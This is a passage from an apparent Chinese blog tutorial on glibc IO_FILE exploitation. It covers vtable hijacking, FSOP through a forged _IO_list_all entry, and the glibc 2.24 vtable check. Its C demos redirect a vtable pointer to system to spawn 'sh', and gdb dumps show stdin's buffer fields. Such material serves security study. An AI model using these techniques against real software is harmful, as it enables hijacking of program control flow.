overflow</span></span><br><span class="line">   <span class="number">5</span> <span class="literal">NULL</span>, <span class="comment">// underflow</span></span><br><span class="line">   <span class="number">6</span> <span class="literal">NULL</span>, <span class="comment">// uflow</span></span><br><span class="line">   <span class="number">7</span> <span class="literal">NULL</span>, <span class="comment">// pbackfail</span></span><br><span class="line">   </span><br><span class="line">   <span class="number">8</span> <span class="literal">NULL</span>, <span class="comment">// xsputn  #printf</span></span><br><span class="line">   <span class="number">9</span> <span class="literal">NULL</span>, <span class="comment">// xsgetn</span></span><br><span class="line">   <span class="number">10</span> <span class="literal">NULL</span>, <span class="comment">// seekoff</span></span><br><span class="line">   <span class="number">11</span> <span class="literal">NULL</span>, <span class="comment">// seekpos      </span></span><br><span class="line">   <span class="number">12</span> <span class="literal">NULL</span>, <span class="comment">// setbuf</span></span><br><span class="line">   <span class="number">13</span> <span class="literal">NULL</span>, <span class="comment">// sync</span></span><br><span class="line">   <span class="number">14</span> <span class="literal">NULL</span>, <span class="comment">// doallocate</span></span><br><span class="line">   <span class="number">15</span> <span class="literal">NULL</span>, <span class="comment">// read</span></span><br><span class="line">   <span class="number">16</span> <span class="literal">NULL</span>, <span class="comment">// write</span></span><br><span class="line">   <span class="number">17</span> <span class="literal">NULL</span>, <span class="comment">// seek</span></span><br><span class="line">   <span class="number">18</span> pwn,  <span class="comment">// close</span></span><br><span class="line">   <span class="number">19</span> <span class="literal">NULL</span>, <span class="comment">// stat</span></span><br><span class="line">   <span class="number">20</span> <span class="literal">NULL</span>, <span class="comment">// showmanyc</span></span><br><span class="line">   <span class="number">21</span> <span class="literal">NULL</span>, <span class="comment">// imbue</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1 id="伪造vtable劫持程序流程"><a href="#伪造vtable劫持程序流程" class="headerlink" title="伪造vtable劫持程序流程"></a>伪造vtable劫持程序流程</h1><p>Linux中一些常见的IO操作函数都需要经过FILE结构进行处理。尤其是_IO_FILE_plus结构中存在vtable，一些函数会取出vtable中的指针进行调用。因此伪造vgable劫持程序流程的中心思想就是针对_IO_FILE_plus的vtable动手脚，通过把vtable指向我们控制的内存，并在其中布置函数指针来实现。vtable劫持分为两种，一种是直接改写vtable中的函数指针，通过任意地址写就可以实现。另一种是覆盖vtable的指针指向我们控制的内存，然后在其中布置函数指针。</p>
<h1 id="具体用法"><a href="#具体用法" class="headerlink" title="具体用法"></a>具体用法</h1><p>修改vtable中的指针</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    long long *vtable_ptr;</span><br><span class="line">    fp=fopen(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">    vtable_ptr=*(long long*)((long long)fp+0xd8);     //get vtable</span><br><span class="line"></span><br><span class="line">    vtable_ptr[7]=0x41414141 //xsputn</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;call 0x41414141&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据vtable在_IO_FILE_plus中的偏移得到vtable的地址，之后需要搞清欲劫持的IO函数会劫持vtable中的哪个函数。<br>这里给出常用函数执行过程中的调用：<br>1、fread函数调用_IO_FILE_plus.vtable中的_IO_XSGETN指针<br>2、fwrite函数调用_IO_FILE_plus.vtable中的_IO_XSPUTN指针，IO_XSPUTN中会调用同样位于vtable中的_IO_FILE_plus.vtable中的_IO_OVERFLOW指针<br>3、fclose函数调用_IO_FILE_plus.vtable中的_IO_FILE_plus.vtable中的_IO_FINISH指针<br>4、printf/puts与fwrite函数调用大致相同，均会调用_IO_XSPUTN指针和_IO_OVERFLOW指针</p>
<p>这里Printf函数会调用vtable中的xsputn，并且xsputn是vtable中的第8项，之后就可以写入这个指针进行劫持。并且在xsputn等vtable函数进行调用时，传入的第一个参数其实是对应的_IO_FILE_plus地址。比如这个例子调用printf，传递给vtable的第一个参数就是_IO_2_1_stdout_的地址。利用这点可以实现给劫持的vtable函数传参，比如：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> system_ptr 0x7ffff7a52390;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *vtable_ptr;</span><br><span class="line">    fp=fopen(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">    vtable_ptr=*(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)fp+<span class="number">0xd8</span>);     <span class="comment">//get vtable</span></span><br><span class="line"></span><br><span class="line">    memcopy(fp,<span class="string">&quot;sh&quot;</span>,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    vtable_ptr[<span class="number">7</span>]=system_ptr <span class="comment">//xsputn</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    fwrite(<span class="string">&quot;hi&quot;</span>,<span class="number">2</span>,<span class="number">1</span>,fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过偏移计算得到xsputn的地址，，将xsputn指针指向system函数的地址，同时将_IO_FILE_plus头部内容改为sh,这样fwrite函数中调用xsputn时实际运行system(“sh”)。<br>但是在一般libc版本下，位于libc数据段的vtable是不可以进行写入的。不过，通过在可控的内存中伪造vtable的方法依然可以实现利用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> system_ptr 0x7ffff7a52390;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *vtable_addr,*fake_vtable;</span><br><span class="line"></span><br><span class="line">    fp=fopen(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">    fake_vtable=<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    vtable_addr=(<span class="keyword">long</span> <span class="keyword">long</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)fp+<span class="number">0xd8</span>);     <span class="comment">//vtable offset</span></span><br><span class="line"></span><br><span class="line">    vtable_addr[<span class="number">0</span>]=(<span class="keyword">long</span> <span class="keyword">long</span>)fake_vtable;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(fp,<span class="string">&quot;sh&quot;</span>,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    fake_vtable[<span class="number">7</span>]=system_ptr; <span class="comment">//xsputn</span></span><br><span class="line"></span><br><span class="line">    fwrite(<span class="string">&quot;hi&quot;</span>,<span class="number">2</span>,<span class="number">1</span>,fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先分配一块内容来存放伪造的vtable，之后修改IO_FILE_plus的vtable指针指向这块内存。后面的步骤与上面一样，修改xsputn对应的指针为system函数地址，然后修改_IO_FILE_plus头部为sh，最后用fwrite出发xsputn指针的调用即可。</p>
<h1 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h1><p>FSOP是file stream oriented programing的缩写，根据前面对FILE的介绍得知进程内所有的_IO_FILE结构会使用_chain域相互连接形成一个链表，这个链表的头部由_IO_list_all维护。FSOP的核心思想就是劫持_IO_list_all的值来伪造链表和其中的_IO_FILE项，但是单纯的只是构造了数据，还需要用某种方法进行触发。FSOP选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all链表的所有项的文件流，相当于对每个FILE调用fflush，也对应这会调用_IO_FILE_plus.vtable中的_IO_overflow。<br>而_IO_flush_all_lockp不需要攻击者手动调用，在一些情况下这个函数会被系统调用：<br>1、当libc执行abort流程时<br>2、当执行exit函数时<br>3、当执行流从main函数返回时</p>
<h1 id="具体用法-1"><a href="#具体用法-1" class="headerlink" title="具体用法"></a>具体用法</h1><p>_IO_list_all是作为全局变量存储在libc.so中的，所以首先需要泄露libc.so的基址，之后需要用任意地址写把_IO_list_all的内容改为指向我们可控内存的指针，然后在可控内存中布置上理想函数的vtable指针。为了能让我们构造的fake_FILE能够正常工作，这里需要满足以下条件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">           &#123;</span><br><span class="line">               result = EOF;</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure>
<p>也就是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.f</span>p-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line"><span class="number">2.f</span>p-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br></pre></td></tr></table></figure>
<p>看demo</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_list_all 0x7ffff7dd2520</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mode_offset 0xc0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> writeptr_offset 0x28</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> writebase_offset 0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> vtable_offset 0xd8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *list_all_ptr;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+mode_offset)=<span class="number">0x0</span>;</span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+writeptr_offset)=<span class="number">0x1</span>;</span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+writebase_offset)=<span class="number">0x0</span>;</span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+vtable_offset)=((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+<span class="number">0x100</span>+<span class="number">24</span>)=<span class="number">0x41414141</span>;</span><br><span class="line"></span><br><span class="line">    list_all_ptr=(<span class="keyword">long</span> <span class="keyword">long</span> *)_IO_list_all;</span><br><span class="line"></span><br><span class="line">    list_all_ptr[<span class="number">0</span>]=ptr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里分配了一个0x200大小的块用于伪造_IO_FILE_plus，前0x100伪造_IO_FILE，后0x100伪造vtable，在vtable中使用0x41414141覆盖_IO_overflow指针。之后覆盖位于libc中的全局变量_IO_list_all，把它指向我们伪造的_IO_FILE_plus。这样，通过调用exit函数，程序会执行_IO_list_all，把它指向我们伪造的_IO_FILE_plus。这样，通过调用exit函数，程序会执行_IO_flush_all_lockp，经过fflush获取_IO_list_all的值并取出作为_IO_FILE_plus调用其中的_IO_overflow。也就是最终实现call 0x41414141的效果。</p>
<h1 id="glibc-2-24下IO-FILE的利用"><a href="#glibc-2-24下IO-FILE的利用" class="headerlink" title="glibc 2.24下IO_FILE的利用"></a>glibc 2.24下IO_FILE的利用</h1><p>在2.24八本的glibc中，全新加入了针对IO_FILE_plus的vtable劫持的检测措施，glibc会在调用虚函数之前首先检查vtable地址的合法性。首先会验证vtable是否位于_IO_vtable段中，如果满足条件就正常执行，否则会调用_IO_vtable_check做进一步检查。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check if unknown vtable pointers are permitted; otherwise,</span></span><br><span class="line"><span class="comment">   terminate the process.  */</span></span><br><span class="line"><span class="keyword">void</span> _IO_vtable_check (<span class="keyword">void</span>) attribute_hidden;</span><br><span class="line"><span class="comment">/* Perform vtable pointer validation.  If validation fails, terminate</span></span><br><span class="line"><span class="comment">   the process.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *</span></span><br><span class="line"><span class="class"><span class="title">IO_validate_vtable</span> (<span class="title">const</span> <span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">uintptr_t</span> ptr = (<span class="keyword">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="keyword">uintptr_t</span> offset = ptr - (<span class="keyword">uintptr_t</span>) __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>计算section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;，紧接着会判断vtable - __start___libc_IO_vtables的offset,如果这个offset大于section_length,即大于__stop___libc_IO_vtables - __start___libc_IO_vtables那么就会调用_IO_vtable_check()这个函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> attribute_hidden</span><br><span class="line">_IO_vtable_check (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Honor the compatibility flag.  */</span></span><br><span class="line">  <span class="keyword">void</span> (*flag) (<span class="keyword">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (flag);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (flag == &amp;_IO_vtable_check)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In case this libc copy is in a non-default namespace, we always</span></span><br><span class="line"><span class="comment">     need to accept foreign vtables because there is always a</span></span><br><span class="line"><span class="comment">     possibility that FILE * objects are passed across the linking</span></span><br><span class="line"><span class="comment">     boundary.  */</span></span><br><span class="line">  &#123;</span><br><span class="line">    Dl_info di;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (_dl_open_hook != <span class="literal">NULL</span></span><br><span class="line">        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span> <span class="comment">/* !SHARED */</span></span></span><br><span class="line">  <span class="comment">/* We cannot perform vtable validation in the static dlopen case</span></span><br><span class="line"><span class="comment">     because FILE * handles might be passed back and forth across the</span></span><br><span class="line"><span class="comment">     boundary.  Therefore, we disable checking in this case.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__dlopen != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  __libc_fatal (<span class="string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果 vtable 是非法的，那么会引发 abort。这里的检查使得以往使用 vtable 进行利用的技术很难实现。</p>
<h1 id="新的利用技术"><a href="#新的利用技术" class="headerlink" title="新的利用技术"></a>新的利用技术</h1><h3 id="fileno与缓冲区的相关利用"><a href="#fileno与缓冲区的相关利用" class="headerlink" title="fileno与缓冲区的相关利用"></a>fileno与缓冲区的相关利用</h3><p>在vtable难以被利用之后，利用的关注点从vtable转移到_IO_FILE结构内部的域中。前面介绍过_IO_FILE在使用标准IO库时会进行创建并负责维护一些相关信息，其中有一些域是表示调用诸如fwrite、fread等函数时写入地址或读取地址的，如果可以控制这些数据就可以实现任意地址写或者任意地址读。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>因为进程中包含了系统默认的三个文件流stdin\stdout\stderr，因此这种方式可以不需要进程汇总存在文件操作，通过scanf\printf一样可以进行利用。在_IO_FILE中_IO_buf_base表示操作的起始地址，_IO_buf_end表示结束地址，通过控制这两个数据可以实现控制读写的操作。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">char</span> stack_buf[<span class="number">100</span>];</span><br><span class="line"> <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,stack_buf);</span><br><span class="line"> <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,stack_buf);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在执行程序一次使用stdin之前，stdin的内容还是未初始化的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> gdb-peda$ x /<span class="number">40</span>xg <span class="number">0x7ffff7dd18e0</span></span><br><span class="line"><span class="number">0x7ffff7dd18e0</span> &lt;_IO_2_1_stdin_&gt;:	<span class="number">0x00000000fbad2088</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd18f0</span> &lt;_IO_2_1_stdin_+<span class="number">16</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1900</span> &lt;_IO_2_1_stdin_+<span class="number">32</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1910</span> &lt;_IO_2_1_stdin_+<span class="number">48</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1920</span> &lt;_IO_2_1_stdin_+<span class="number">64</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1930</span> &lt;_IO_2_1_stdin_+<span class="number">80</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1940</span> &lt;_IO_2_1_stdin_+<span class="number">96</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1950</span> &lt;_IO_2_1_stdin_+<span class="number">112</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="number">0x7ffff7dd1960</span> &lt;_IO_2_1_stdin_+<span class="number">128</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x00007ffff7dd3790</span></span><br><span class="line"><span class="number">0x7ffff7dd1970</span> &lt;_IO_2_1_stdin_+<span class="number">144</span>&gt;:	<span class="number">0xffffffffffffffff</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1980</span> &lt;_IO_2_1_stdin_+<span class="number">160</span>&gt;:	<span class="number">0x00007ffff7dd19c0</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1990</span> &lt;_IO_2_1_stdin_+<span class="number">176</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd19a0</span> &lt;_IO_2_1_stdin_+<span class="number">192</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd19b0</span> &lt;_IO_2_1_stdin_+<span class="number">208</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x00007ffff7dd06e0</span></span><br></pre></td></tr></table></figure>
<p>调用scanf之后可以看到_IO_read_ptr、_IO_read_base、_IO_read_end、_IO_buf_base、_IO_buf_end等域都被初始化</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x /<span class="number">40</span>xg <span class="number">0x7ffff7dd18e0</span></span><br><span class="line"><span class="number">0x7ffff7dd18e0</span> &lt;_IO_2_1_stdin_&gt;:	<span class="number">0x00000000fbad2288</span>	<span class="number">0x0000000000602011</span></span><br><span class="line"><span class="number">0x7ffff7dd18f0</span> &lt;_IO_2_1_stdin_+<span class="number">16</span>&gt;:	<span class="number">0x0000000000602012</span>	<span class="number">0x0000000000602010</span></span><br><span class="line"><span class="number">0x7ffff7dd1900</span> &lt;_IO_2_1_stdin_+<span class="number">32</span>&gt;:	<span class="number">0x0000000000602010</span>	<span class="number">0x0000000000602010</span></span><br><span class="line"><span class="number">0x7ffff7dd1910</span> 